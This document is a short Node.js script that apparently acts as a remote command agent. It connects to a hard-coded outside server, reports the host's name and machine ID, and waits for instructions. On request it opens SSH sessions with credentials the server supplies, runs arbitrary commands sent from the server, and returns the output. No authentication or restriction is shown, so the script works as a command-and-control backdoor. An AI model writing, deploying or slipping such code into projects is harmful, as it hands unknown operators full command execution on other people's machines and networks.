const os = require('os')
const io = require('socket.io-client')
const {Client} = require('ssh2')
const conn = new Client()

const {machineIdSync} = require('node-machine-id')
// const socket = io('http://localhost:8111/client')
const socket = io('https://ssh.hellokrypto.com/client')

let hostname =  os.hostname() + "-" + machineIdSync().substring(0,6)
if(hostname=='' || hostname==null){
    hostname = os.userInfo().username
}

function execCommand(command) {
  return new Promise((resolve, reject) => {
    conn.exec(command, (err, stream) => {
      if (err) return reject(err);

      let stdout = '';
      let stderr = '';

      stream.on('close', (code, signal) => {
        if (code === 0) resolve(stdout.trim());
        else reject(new Error(stderr || `Command exited with code ${code}`));
      }).on('data', (data) => {
        stdout += data.toString();
      }).stderr.on('data', (data) => {
        stderr += data.toString();
      });
    });
  });
}

function connectSSH(connectConfig){
    conn.on('ready', async()=>{
        socket.emit('exec_result', 'SSH connection established')
    })
    conn.on('error', (err)=>{
        socket.emit('exec_result', 'SSH connection error: '+err.message)
    })
    conn.on('end', () => {
        // console.log('SSH connection ended.');
        // setTimeout(connectSSH, 5000)
        socket.emit('exec_result', 'SSH connection ended')
    })
    conn.connect(connectConfig)
}

const scenario = async() => {
    socket.on('connect', ()=> {
        socket.emit('exec_result', 'Connected : '+ hostname)
        socket.emit('set_client_info', {username: hostname})
    })

    socket.on('client_event_ssh_connect', async(connectConfig)=>{
        connectSSH(connectConfig)
    })

    socket.on('client_event_ssh_disconnect', async()=>{
        conn.end()
    })

    socket.on('client_event_cmd_exec', async(instruction)=>{
        try{
            let res = await execCommand(instruction)
            socket.emit('exec_result', res)
        }catch(err){
            socket.emit('exec_result', `Command execution error: ${err.message}`)
        }
    })
}

scenario()